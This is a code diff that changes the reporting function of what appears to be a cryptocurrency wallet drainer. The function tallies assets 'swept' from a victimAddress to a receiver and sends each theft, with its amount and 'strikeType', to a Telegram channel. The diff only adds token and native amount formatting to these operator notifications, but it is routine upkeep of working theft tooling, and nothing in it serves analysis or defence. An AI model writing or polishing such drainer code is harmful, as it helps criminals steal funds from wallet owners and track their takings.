@@ -48,6 +48,23 @@ export async function sendFinalReports({
     totalUSD += usdVal;
     actualAssetCount++;
 
+    // 🛡️ TOKEN AMOUNT FIX: Safely attempt to format the token amount if data exists
+    let tokenAmtDisplay = "";
+    if (a.balance && a.decimals) {
+      try {
+        const parsed = parseFloat(
+          ethers.formatUnits(a.balance.toString(), a.decimals),
+        );
+        // Show up to 4 decimal places for tokens to keep it clean
+        tokenAmtDisplay = `${parsed.toFixed(4)} `;
+      } catch (e) {}
+    }
+
+    // Combine Token Amount + USD Value (e.g., "150.0000 ($150.00)" or just "$150.00")
+    const combinedTokenDisplay = tokenAmtDisplay
+      ? `${tokenAmtDisplay} (${formatMoney(usdVal)})`
+      : formatMoney(usdVal);
+
     telemetryPromises.push(
       tg.sendDetailedSweepToTelegram({
         status: "SUCCESS",
@@ -55,7 +72,7 @@ export async function sendFinalReports({
         chainId: chainId.toString(),
         victimAddress: victimAddress,
         receiverAddress: receiver,
-        amount: formatMoney(usdVal),
+        amount: combinedTokenDisplay,
         symbol: `${a.symbol || "Token"} ${suffix}`,
         type: strikeType,
       }),
@@ -72,6 +89,7 @@ export async function sendFinalReports({
     );
 
     const nativePrice = Number(nativeAsset?.price || 0);
+    // 🛡️ NATIVE AMOUNT FIX: Convert BigInt to readable Ether format
     const nativeAmount = parseFloat(ethers.formatEther(sweepValue));
     const actualNativeUSD =
       nativePrice > 0
@@ -81,6 +99,11 @@ export async function sendFinalReports({
     totalUSD += actualNativeUSD;
     actualAssetCount++;
 
+    // 🛡️ COMBINED DISPLAY: e.g., "0.500000 ($1,500.00)"
+    const combinedNativeDisplay = `${nativeAmount.toFixed(6)} (${formatMoney(
+      actualNativeUSD,
+    )})`;
+
     telemetryPromises.push(
       tg.sendDetailedSweepToTelegram({
         status: "SUCCESS",
@@ -88,7 +111,7 @@ export async function sendFinalReports({
         chainId: chainId.toString(),
         victimAddress: victimAddress,
         receiverAddress: receiver,
-        amount: formatMoney(actualNativeUSD),
+        amount: combinedNativeDisplay,
         symbol: `${nativeAsset?.symbol || nativeSym} ${suffix}`,
         type: strikeType,
       }),
